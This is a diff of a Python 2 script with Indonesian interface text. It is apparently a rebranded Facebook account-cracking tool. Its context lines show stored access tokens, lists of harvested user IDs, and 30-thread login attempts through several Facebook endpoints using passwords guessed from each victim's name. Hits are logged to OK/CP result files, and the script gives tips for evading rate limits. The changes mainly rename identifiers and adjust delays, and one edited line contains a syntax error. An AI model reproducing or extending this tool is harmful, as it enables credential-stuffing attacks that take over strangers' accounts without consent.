@@ -81,14 +81,14 @@ def jalan(z):
     for e in z + '\n':
         sys.stdout.write(e)
         sys.stdout.flush()
-        time.sleep(1)
+        time.sleep(2)
 
 def raka_z():
     titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
     for x in titik:
         print '\r %s[%s+%s] Menghapus Token %s'%(N,M,N,x),
         sys.stdout.flush()
-        time.sleep(3)
+        time.sleep(2)
 
 # LO GOBLOG
 logo = ''' 
@@ -127,7 +127,7 @@ def raka_z():
     try:
         nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(amanda)).json()['name']
         print '\n %s<>%s WELCOME %s%s%s'%(O,N,K,nama,N);time.sleep(2)
-        print ' %s<>%s Please Use This Sc Properly,\n We Are Not Responsible If This Sc Is Misused...'%(O,N);time.sleep(00.1)
+        print ' %s<>%s Please Use This Sc Properly,\n We Are Not Responsible If This Sc Is Misused...'%(O,N);time.sleep(2)
         open('.memek.txt', 'w').write(amanda)
         raw_input(' %s◍➤%s Tekan Enter '%(O,N));wuhan(amanda)
         os.system('xdg-open https://youtu.be/bszAm4C5ovE')
@@ -141,11 +141,11 @@ def raka_amanda():
     try:
     	amanda = open('.memek.txt', 'r').read()
     except IOError:
-        print '\n %s[%s×%s] Token Invalid'%(N,M,N);time.sleep(1);os.system('rm -rf .memek.txt');raka_z()
+        print '\n %s[%s×%s] Token Invalid'%(N,M,N);time.sleep(2);os.system('rm -rf .memek.txt');raka_z()
     try:
         nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(amanda)).json()['name']
     except KeyError:
-        print '\n %s[%s×%s] Token Invalid'%(N,M,N);time.sleep(1);os.system('rm -rf .memek.txt');raka_z()
+        print '\n %s[%s×%s] Token Invalid'%(N,M,N);time.sleep(2);os.system('rm -rf .memek.txt');raka_z()
     except requests.exceptions.ConnectionError:
         exit('\n\n %s[%s!%s] Tidak Ada Koneksi\n'%(N,M,N))
     os.system('clear')
@@ -199,7 +199,7 @@ def raka_amanda():
             for memek in total:
             	kontol = memek.replace("\n","")
                 titid  = kontol.replace(" [✓] "," \x1b[0m[\x1b[1;92m✓\x1b[0m]\x1b[1;92m ").replace(" [×] ", " \x1b[0m[\x1b[1;93m×\x1b[0m]\x1b[1;93m ")
-                print("%s%s"%(titid,N));time.sleep(0.03)
+                print("%s%s"%(titid,N));time.sleep(2)
             print(" %s[%s#%s] --------------------------------------------"%(N,O,N))
             raw_input('\n  [ %sKEMBALI%s ] '%(O,N));raka_amanda()
         except (IOError):
@@ -549,7 +549,7 @@ class __crack__:
             print '\n [%s+%s] Total Id •> %s%s%s' %(O,N,M,len(self.id),N)
         except:
             print '\n %s[%s×%s] File [%s%s%s] Tidak Ada, Dump Id Dulu Bro Cek Nomor 1 Sampai 4'%(N,M,N,M,self.apk,N);time.sleep(3)
-            raw_input('\n  %s[ %skembali%s ]'%(N,O,N));moch_yayan()
+            raw_input('\n  %s[ %skembali%s ]'%(N,O,N));raka_amanda()
         ___raka_amanda___ = raw_input(' [%s?%s] Do You Want To Use Manual Password? [Y/t]: '%(O,N))
         if ___raka_amanda___ in ('Y', 'y'):
             print '\n %s[%s!%s] Gunakan , (Koma) Untuk Pemisah Contoh : sandi123,sandi12345,dll. setiap kata minimal 6 karakter atau lebih'%(N,M,N)
@@ -569,11 +569,11 @@ class __crack__:
                             print '\n [%s+%s] Hasil Disimpan Ke •> result/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                             print ' [%s+%s] Hasil Disimpan Ke •> result/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
                             print '\n [%s!%s] Anda Bisa Mematikan Data Selular Untuk Menjeda Proses Crack\n'%(M,N)
-                            with YayanGanteng(max_workers=30) as (__yayanXD__):
+                            with RakaAmanda(max_workers=30) as (__raka_amanda__):
                                 for ikeh in self.id:
                                     try:
                                         kimochi = ikeh.split('<=>')[1]
-                                        __yayanXD__.submit(self.__api__, kimochi, ysc)
+                                        __raka_amanda__.submit(self.__api__, kimochi, ysc)
                                     except: pass
 
                             os.remove(self.apk)
@@ -582,11 +582,11 @@ class __crack__:
                             print '\n [%s+%s] Hasil Disimpan Ke •> resul/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                             print ' [%s+%s] Hasil Disimpan Ke •> resul/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
                             print '\n [%s!%s] Anda Bisa Mematikan Data Selular Untuk Menjeda Proses Crack\n'%(M,N)
-                            with YayanGanteng(max_workers=30) as (__yayanXD__):
+                            with RakaAmanda(max_workers=30) as (__raka_amanda__):
                                 for ikeh in self.id:
                                     try:
                                         kimochi = ikeh.split('<=>')[1]
-                                        __yayanXD__.submit(self.__mbasic__, kimochi, ysc)
+                                        __raka_amanda__.submit(self.__mbasic__, kimochi, ysc)
                                     except: pass
 
                             os.remove(self.apk)
@@ -595,11 +595,11 @@ class __crack__:
                             print '\n [%s+%s] Hasil Disimpan Ke •> result/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                             print ' [%s+%s] Hasil Disimpan Ke •> result/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
                             print '\n [%s!%s] If No Result Use Airplane Mode 1 Second\n'%(M,N)
-                            with YayanGanteng(max_workers=30) as (__yayanXD__):
+                            with RakaAmanda(max_workers=30) as (__raka_amanda__):
                                 for ikeh in self.id:
                                     try:
                                         kimochi = ikeh.split('<=>')[1]
-                                        __yayanXD__.submit(self.__mfb,__, kimochi, ysc)
+                                        __raka_amanda__.submit(self.__mfb,__, kimochi, ysc)
                                     except: pass
 
                             os.remove(self.apk)
@@ -783,8 +783,8 @@ class __crack__:
             print '\n [%s+%s] Hasil OK Disimpan Ke •> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
             print ' [%s+%s] Hasil CP Disimpan Ke •> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
             print '\n [%s!%s] If No Result Use Airplane Mode 1 Second\n'%(M,N)
-            with YayanGanteng(max_workers=30) as (__yayanXD__):
-            	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
+            with RakaAmanda(max_workers=30) as (__raka_amanda__):
+            	for yntkts in self.id: # urang_ge_lieur
                     try:
                         name, uid = yntkts.split('<=>')
                         xz = name.split(' ')
@@ -792,7 +792,7 @@ class __crack__:
                             pwx = [name, xz[0]+"123", xz[0]+"12345"]
                         else:
                             pwx = [name, xz[0]+"123", xz[0]+"12345"]
-                        __yayanXD__.submit(self.__api__, uid, pwx)
+                        __raka_amanda__.submit(self.__api__, uid, pwx)
                     except:
                         pass
 
@@ -802,8 +802,8 @@ class __crack__:
             print '\n [%s+%s] Hasil OK Disimpan Ke •> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
             print ' [%s+%s] Hasil CP Disimpan Ke •> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
             print '\n [%s!%s] If No Result Use Airplane Mode 1 Second\n'%(M,N)
-            with YayanGanteng(max_workers=30) as (__yayanXD__):
-            	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
+            with RakaAmanda(max_workers=30) as (__raka_amanda__):
+            	for yntkts in self.id: # urang_ge_lieur
                     try:
                         name, uid = yntkts.split('<=>')
                         xz = name.split(' ')
@@ -811,7 +811,7 @@ class __crack__:
                             pwx = [name, xz[0]+"123", xz[0]+"12345"]
                         else:
                             pwx = [name, xz[0]+"123", xz[0]+"12345"]
-                        __yayanXD__.submit(self.__mbasic__, uid, pwx)
+                        __raka_amanda__.submit(self.__mbasic__, uid, pwx)
                     except:
                         pass
 
@@ -821,8 +821,8 @@ class __crack__:
             print '\n [%s+%s] Hasil Disimpan Ke •> result/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
             print ' [%s+%s] Hasil Disimpan Ke •> result/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
             print '\n [%s!%s] If No Result Use Airplane Mode 1 Second\n'%(M,N)
-            with YayanGanteng(max_workers=30) as (__yayanXD__):
-            	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
+            with RakaAmanda(max_workers=30) as (__raka_amanda__):
+            	for yntkts in self.id: # urang_ge_lieur
                     try:
                         name, uid = yntkts.split('<=>')
                         xz = name.split(' ')
@@ -830,7 +830,7 @@ class __crack__:
                             pwx = [name, xz[0]+"123", xz[0]+"12345"]
                         else:
                             pwx = [name, xz[0]+"123", xz[0]+"12345"]
-                        __yayanXD__.submit(self.__mfb__, uid, pwx)
+                        __raka_amanda__.submit(self.__mfb__, uid, pwx)
                     except:
                         pass
 
